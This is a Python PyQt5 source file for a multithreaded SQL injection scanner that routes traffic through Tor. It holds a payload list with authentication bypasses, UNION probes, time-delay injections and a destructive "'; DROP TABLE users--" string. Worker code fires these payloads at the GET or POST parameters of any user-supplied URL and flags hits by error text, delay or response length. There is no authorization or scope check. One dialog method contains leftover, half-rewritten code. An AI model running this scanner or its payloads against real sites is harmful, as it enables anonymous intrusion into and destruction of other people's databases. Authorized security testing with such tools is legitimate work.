#!/usr/bin/env python3
"""
🔍 SQL Injection Scanner – GET/POST, Tor SOCKS5, Multithreaded
"""
import sys
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton,
    QComboBox, QTextEdit, QProgressBar, QFileDialog, QMessageBox,
    QDialogButtonBox, QGroupBox, QTableWidget, QTableWidgetItem,
    QHeaderView, QSplitter, QWidget, QCheckBox, QSpinBox
)
from PyQt5.QtGui import QColor

# ========== Configuration ==========
TOR_PROXY = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
PAYLOADS = [
    "'", '"', "')", "')",
    " OR '1'='1", " OR '1'='1' --", " OR '1'='1' #",
    "' OR 1=1 --", "' OR 1=1 #",
    "admin' --", "admin' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "1' AND 1=1--", "1' AND 1=2--",
    "' AND SLEEP(5)--", "' AND SLEEP(3)--",
    "1' OR '1'='1", "' OR 'x'='x",
    "'; DROP TABLE users--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
]
TIMEOUT = 15
MAX_THREADS = 10

# ========== Worker Thread ==========
class ScannerWorker(QThread):
    progress = pyqtSignal(int, int)
    result_found = pyqtSignal(str, str, str, str)  # param, payload, method, info
    finished = pyqtSignal()
    error = pyqtSignal(str)

    def __init__(self, url, params, method='GET'):
        super().__init__()
        self.url = url
        self.params = params if params else []  # list of param names
        self.method = method.upper()
        self._stop = False
        self.session = requests.Session()
        self.session.proxies = TOR_PROXY

    def run(self):
        total_tests = len(self.params) * len(PAYLOADS)
        tested = 0
        try:
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                futures = []
                for param in self.params:
                    for payload in PAYLOADS:
                        if self._stop:
                            executor.shutdown(wait=False)
                            return
                        future = executor.submit(self.test_injection, param, payload)
                        futures.append(future)

                for future in as_completed(futures):
                    if self._stop:
                        break
                    tested += 1
                    self.progress.emit(tested, total_tests)
                    result = future.result()
                    if result:
                        param, payload, info = result
                        self.result_found.emit(param, payload, self.method, info)
        except Exception as e:
            self.error.emit(str(e))
        finally:
            self.finished.emit()

    def test_injection(self, param, payload):
        try:
            if self.method == 'GET':
                return self._test_get(param, payload)
            else:  # POST
                return self._test_post(param, payload)
        except:
            return None

    def _test_get(self, param, payload):
        parsed = urlparse(self.url)
        query = parse_qs(parsed.query)
        if param not in query:
            return None
        # Original query for baseline
        original_url = self.url
        # Injected query
        new_query = query.copy()
        new_query[param] = [payload]
        new_query_string = urlencode(new_query, doseq=True)
        injected_url = urlunparse(parsed._replace(query=new_query_string))

        # Baseline request
        baseline_resp = self.session.get(original_url, timeout=TIMEOUT)
        baseline_time = baseline_resp.elapsed.total_seconds()
        baseline_length = len(baseline_resp.content)

        # Injected request
        injected_resp = self.session.get(injected_url, timeout=TIMEOUT)
        injected_time = injected_resp.elapsed.total_seconds()
        injected_length = len(injected_resp.content)

        # Error signatures
        error_sigs = [
            "sql", "mysql", "postgresql", "oracle", "syntax error",
            "unclosed quotation mark", "unclosed string", "sqlexception",
            "warning", "database error", "driver", "odbc"
        ]
        if any(sig in injected_resp.text.lower() for sig in error_sigs):
            return (param, payload, "Error-based SQLi detected")

        # Time-based (if payload contains sleep)
        if any(x in payload.upper() for x in ['SLEEP', 'WAITFOR', 'PG_SLEEP']):
            if injected_time > baseline_time + 2.5:
                return (param, payload, f"Time-based (delay {injected_time:.1f}s vs {baseline_time:.1f}s)")

        # Boolean-based (large difference in response length)
        if abs(injected_length - baseline_length) > 200:
            return (param, payload, f"Boolean-based (length diff {abs(injected_length - baseline_length)})")

        # Simple content check
        if "1=1" in payload.lower() and "1=1" in injected_resp.text:
            return (param, payload, "Boolean-based (1=1 reflected)")

        return None

    def _test_post(self, param, payload):
        # POST assumes we have form data; we'll use dummy POST with all params including the target
        post_data = {p: '1' for p in self.params}  # dummy values
        post_data[param] = payload

        # Baseline
        baseline_data = {p: '1' for p in self.params}
        baseline_resp = self.session.post(self.url, data=baseline_data, timeout=TIMEOUT)
        baseline_time = baseline_resp.elapsed.total_seconds()
        baseline_length = len(baseline_resp.content)

        # Injected
        injected_resp = self.session.post(self.url, data=post_data, timeout=TIMEOUT)
        injected_time = injected_resp.elapsed.total_seconds()
        injected_length = len(injected_resp.content)

        # Error signatures
        error_sigs = ["sql", "mysql", "syntax", "error", "unclosed", "exception"]
        if any(sig in injected_resp.text.lower() for sig in error_sigs):
            return (param, payload, "Error-based SQLi detected")

        # Time-based
        if any(x in payload.upper() for x in ['SLEEP', 'WAITFOR', 'PG_SLEEP']):
            if injected_time > baseline_time + 2.5:
                return (param, payload, f"Time-based (delay {injected_time:.1f}s)")

        # Boolean-based
        if abs(injected_length - baseline_length) > 200:
            return (param, payload, f"Boolean-based (length diff {abs(injected_length - baseline_length)})")

        return None

    def stop(self):
        self._stop = True

# ========== SQL Scanner Dialog ==========
class SqlScannerDialog(QDialog):
    def __init__(self, current_url='', parent=None):
        super().__init__(parent)
        self.setWindowTitle("🔍 SQL Injection Scanner – GET/POST")
        self.setMinimumSize(800, 700)
        self.setStyleSheet("""
            QDialog { background-color: #121212; }
            QLabel { color: #00ff00; }
            QLineEdit, QComboBox, QTextEdit, QSpinBox { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 5px; }
            QPushButton { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 8px; }
            QPushButton:hover { background: #2a2a2a; }
            QProgressBar { border: 1px solid #00ff00; text-align: center; color: #00ff00; }
            QProgressBar::chunk { background-color: #00ff00; }
            QTableWidget { background: #1a1a1a; color: #00ff00; gridline-color: #00ff00; }
            QTableWidget::item { color: #00ff00; }
            QHeaderView::section { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; }
        """)

        layout = QVBoxLayout()

        # URL input
        layout.addWidget(QLabel("Target URL:"))
        self.url_input = QLineEdit()
        self.url_input.setText(current_url)
        layout.addWidget(self.url_input)

        # Parameters group
        param_group = QGroupBox("Parameters to Test")
        param_group.setStyleSheet("QGroupBox { color: #00ff00; border: 1px solid #00ff00; margin-top: 10px; }")
        pg_layout = QVBoxLayout()
        self.param_input = QLineEdit()
        self.param_input.setPlaceholderText("Comma-separated param names (auto-filled from GET)")
        pg_layout.addWidget(self.param_input)
        btn_row = QHBoxLayout()
        self.extract_btn = QPushButton("Extract GET Params")
        self.extract_btn.clicked.connect(self.extract_params)
        btn_row.addWidget(self.extract_btn)
        self.add_param_btn = QPushButton("Add Custom")
        self.add_param_btn.clicked.connect(self.add_custom_param)
        btn_row.addWidget(self.add_param_btn)
        pg_layout.addLayout(btn_row)
        param_group.setLayout(pg_layout)
        layout.addWidget(param_group)

        # Method selection & threads
        method_row = QHBoxLayout()
        method_row.addWidget(QLabel("Method:"))
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST"])
        method_row.addWidget(self.method_combo)
        method_row.addWidget(QLabel("Threads:"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 20)
        self.thread_spin.setValue(10)
        method_row.addWidget(self.thread_spin)
        layout.addLayout(method_row)

        # Start/Stop
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("💣 Start Scan")
        self.start_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.start_btn)
        self.stop_btn = QPushButton("⏹️ Stop")
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self.stop_scan)
        btn_layout.addWidget(self.stop_btn)
        layout.addLayout(btn_layout)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)

        # Results table
        self.results_table = QTableWidget(0, 4)
        self.results_table.setHorizontalHeaderLabels(["Parameter", "Payload", "Method", "Evidence"])
        self.results_table.horizontalHeader().setStretchLastSection(True)
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.results_table)

        # Close
        btn_box = QDialogButtonBox(QDialogButtonBox.Close)
        btn_box.rejected.connect(self.reject)
        layout.addWidget(btn_box)

        self.setLayout(layout)
        self.worker = None
        # Auto-extract params on open
        if self.url_input.text():
            self.extract_params()

    def extract_params(self):
        url = self.url_input.text().strip()
        if not url:
            return
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        self.param_input.setText(', '.join(params))

    def add_custom_param(self):
        existing = self.param_input.text().strip()
        custom, ok = QFileDialog.getSaveFileName(self, "Enter parameter name", "")
        # We'll use QInputDialog instead
        pass  # Use QInputDialog for simplicity
        # Actually implement:
        from PyQt5.QtWidgets import QInputDialog
        text, ok = QInputDialog.getText(self, "Add Parameter", "Parameter name:")
        if ok and text:
            if existing:
                self.param_input.setText(existing + ', ' + text)
            else:
                self.param_input.setText(text)

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Enter a target URL.")
            return
        params_text = self.param_input.text().strip()
        if not params_text:
            QMessageBox.warning(self, "Error", "Add at least one parameter to test.")
            return
        params = [p.strip() for p in params_text.split(',') if p.strip()]

        self.results_table.setRowCount(0)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

        global MAX_THREADS
        MAX_THREADS = self.thread_spin.value()

        self.worker = ScannerWorker(url, params, method=self.method_combo.currentText())
        self.worker.progress.connect(self.update_progress)
        self.worker.result_found.connect(self.add_result)
        self.worker.finished.connect(self.on_finished)
        self.worker.error.connect(self.on_error)
        self.worker.start()

    def stop_scan(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
        self.stop_btn.setEnabled(False)

    def update_progress(self, current, total):
        self.progress_bar.setMaximum(total)
        self.progress_bar.setValue(current)

    def add_result(self, param, payload, method, evidence):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        self.results_table.setItem(row, 0, QTableWidgetItem(param))
        self.results_table.setItem(row, 1, QTableWidgetItem(payload))
        self.results_table.setItem(row, 2, QTableWidgetItem(method))
        self.results_table.setItem(row, 3, QTableWidgetItem(evidence))
        # Highlight vulnerable row
        for col in range(4):
            self.results_table.item(row, col).setBackground(QColor("#330000"))
            self.results_table.item(row, col).setForeground(QColor("#ff0000"))

    def on_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)

    def on_error(self, err):
        QMessageBox.critical(self, "Error", str(err))
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
